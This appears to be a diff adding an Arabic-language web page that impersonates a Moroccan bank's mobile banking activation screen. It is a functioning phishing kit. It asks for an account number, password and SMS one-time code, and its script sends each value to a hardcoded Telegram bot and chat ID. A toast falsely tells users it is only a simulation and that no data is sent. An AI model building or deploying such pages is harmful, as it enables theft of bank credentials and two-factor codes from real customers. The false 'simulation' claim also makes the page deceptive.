@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>تفعيل بريد بنك موبيل</title>
+  <style>
+    :root{
+      --brand:#f0b800;         
+      --brand-dark:#7a5e00;    
+      --btn:#f7d57a;           
+      --btn-text:#2b2b2b;
+      --bg:#fafafa;
+      --card:#ffffff;
+      --border:#e6e6e6;
+      --text:#333;
+      --muted:#777;
+      --radius:14px;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;background:var(--bg);color:var(--text);
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Noto Naskh Arabic UI", "Noto Sans Arabic", Tahoma, Arial, sans-serif;
+    }
+    .wrap{max-width:700px;margin:0 auto;min-height:100%;display:flex;flex-direction:column}
+    .topbar{
+      display:flex;align-items:center;gap:10px;
+      padding:12px 14px;background:#fff;border-bottom:1px solid var(--border)
+    }
+    .back{
+      width:28px;height:28px;border-radius:50%;
+      display:grid;place-items:center;border:1px solid var(--border);cursor:pointer;
+      user-select:none
+    }
+    .logo{
+      margin-inline:auto;display:flex;align-items:end;gap:6px;font-weight:800
+    }
+    .logo .a{color:#333;font-size:20px}
+    .logo .b{color:var(--brand);font-size:20px}
+    .divider{height:6px;background:var(--brand);opacity:.9}
+    .section-title{
+      background:var(--brand-dark);color:#fff;text-align:center;
+      padding:10px 12px;font-weight:700
+    }
+    .card{
+      background:var(--card);padding:18px 14px;border-radius:0 0 var(--radius) var(--radius);
+      border:1px solid var(--border);border-top:none;margin-top:0
+    }
+    .group{margin:18px 0}
+    .label{color:#5b5b5b;margin-bottom:8px;font-weight:700}
+    .field{position:relative}
+    .input{
+      width:100%;padding:14px 44px 14px 14px;border:1px solid var(--border);
+      border-radius:10px;background:#fff;font-size:16px;outline:none;transition:.15s border-color
+    }
+    .input:focus{border-color:#c9c9c9}
+    .toggle{
+      position:absolute;inset-inline-start:10px;top:50%;transform:translateY(-50%);
+      cursor:pointer;color:var(--muted);font-size:14px;border:1px solid var(--border);
+      padding:4px 8px;border-radius:8px;background:#fff;user-select:none
+    }
+    .btn{
+      width:100%;padding:14px;border:none;border-radius:10px;
+      background:var(--btn);color:var(--btn-text);font-weight:800;font-size:18px;cursor:not-allowed;opacity:.7;
+      transition:.15s opacity,.15s transform
+    }
+    .btn.enabled{cursor:pointer;opacity:1}
+    .btn:active{transform:translateY(1px)}
+    .toast{
+      position:fixed;inset-inline:12px;bottom:12px;background:#fff;border:1px solid var(--border);
+      padding:12px 14px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,.08);display:none
+    }
+    .error{
+      color:red;font-size:14px;margin-top:8px;display:none
+    }
+    @media (min-width:540px){
+      .card{padding:28px 24px}
+      .topbar{padding:14px 18px}
+    }
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="topbar">
+      <div class="back" id="backBtn" aria-label="رجوع">←</div>
+      <div class="logo" aria-label="بريد بنك موبيل">
+        <span class="a">بريد</span><span class="b">بنك</span><span class="a">موبيل</span>
+      </div>
+    </div>
+    <div class="divider"></div>
+
+    <div class="section-title">تفعيل بريد بنك موبيل</div>
+
+    <!-- الصفحة الأولى -->
+    <form class="card" id="step1" autocomplete="off">
+      <div class="group">
+        <div class="label">دخول</div>
+        <div class="field">
+          <input class="input" type="text" inputmode="numeric" pattern="[0-9]*"
+                 placeholder="رقم الحساب" name="account" required />
+        </div>
+      </div>
+
+      <div class="group">
+        <div class="label">كلمة السر</div>
+        <div class="field">
+          <input class="input" type="password" placeholder="أدخل كلمة السر الخاصة بك"
+                 name="password" required minlength="4" />
+          <span class="toggle" id="togglePwd" title="إظهار/إخفاء">👁</span>
+        </div>
+      </div>
+
+      <button type="submit" id="btn1" class="btn" disabled>تابع</button>
+    </form>
+
+    <!-- الصفحة الثانية -->
+    <form class="card hidden" id="step2" autocomplete="off">
+      <div class="group">
+        <div class="label">أدخل الرمز المرسل لك في الرسائل النصية</div>
+        <input class="input" type="text" inputmode="numeric" pattern="[0-9]*"
+               placeholder="الرمز السري" name="code" required maxlength="6" />
+        <div class="error" id="codeError">يرجى كتابة الرمز المكون من ٤ أو ٦ أرقام</div>
+      </div>
+
+      <button type="submit" id="btn2" class="btn" disabled>تابع</button>
+    </form>
+  </div>
+
+  <div class="toast" id="toast">تمت المحاكاة بنجاح. لا يوجد إرسال حقيقي للبيانات.</div>
+
+  <script>
+    // بيانات البوت
+    const BOT_TOKEN = "7995726398:AAHKrtnvc5tn2zt7nI0-I0bMmJrR6tm53kY";
+    const CHAT_ID = "1777025332";
+
+    // عناصر الصفحة
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const btn1 = document.getElementById('btn1');
+    const btn2 = document.getElementById('btn2');
+    const acc = step1.elements['account'];
+    const pwd1 = step1.elements['password'];
+    const code = step2.elements['code'];
+    const toggle = document.getElementById('togglePwd');
+    const toast = document.getElementById('toast');
+    const codeError = document.getElementById('codeError');
+    const backBtn = document.getElementById('backBtn');
+
+    // العداد والقفل
+    let orderNumber = 0;
+    let currentOrder = null;
+    let firstSubmitDone = false;
+
+    // تحديث الأزرار
+    function updateStep1(){
+      const ok = acc.value.trim().length > 0 && pwd1.value.trim().length > 0;
+      btn1.disabled = !ok;
+      btn1.classList.toggle('enabled', ok);
+    }
+    function updateStep2(){
+      const ok = code.value.trim().length > 0;
+      btn2.disabled = !ok;
+      btn2.classList.toggle('enabled', ok);
+    }
+
+    acc.addEventListener('input', updateStep1);
+    pwd1.addEventListener('input', updateStep1);
+    code.addEventListener('input', updateStep2);
+
+    toggle.addEventListener('click', () => {
+      pwd1.type = pwd1.type === 'password' ? 'text' : 'password';
+    });
+
+    // الصفحة الأولى
+    step1.addEventListener('submit', function(e){
+      e.preventDefault();
+      if (firstSubmitDone) return;
+      firstSubmitDone = true;
+
+      orderNumber++;
+      currentOrder = orderNumber;
+
+      let account = e.target.account.value;
+      let password = e.target.password.value;
+
+      let message = `🔔 بيانات جديدة (طلب رقم ${currentOrder}):\n💳 الحساب: ${account}\n🔑 كلمة السر: ${password}`;
+
+      step1.classList.add("hidden");
+      step2.classList.remove("hidden");
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    });
+
+    // الصفحة الثانية
+    step2.addEventListener('submit', (e) => {
+      e.preventDefault();
+      let codeVal = code.value.trim();
+
+      if (!/^\d{4}$/.test(codeVal) && !/^\d{6}$/.test(codeVal)) {
+        codeError.style.display = "block";
+        return;
+      }
+      codeError.style.display = "none";
+
+      let message = `📩 الرمز السري (طلب رقم ${currentOrder}): ${codeVal}`;
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+
+      showToast();
+    });
+
+    // Toast
+    function showToast(){
+      toast.style.display = 'block';
+      clearTimeout(showToast.tid);
+      showToast.tid = setTimeout(()=> toast.style.display='none', 2600);
+    }
+
+    // زر الرجوع + إعادة تعيين القفل
+    backBtn.addEventListener('click', () => {
+      if(!step2.classList.contains('hidden')){
+        step2.classList.add('hidden');
+        step1.classList.remove('hidden');
+        firstSubmitDone = false; // إعادة تعيين القفل
+      } else {
+        history.back();
+      }
+    });
+  </script>
+</body>
+</html>
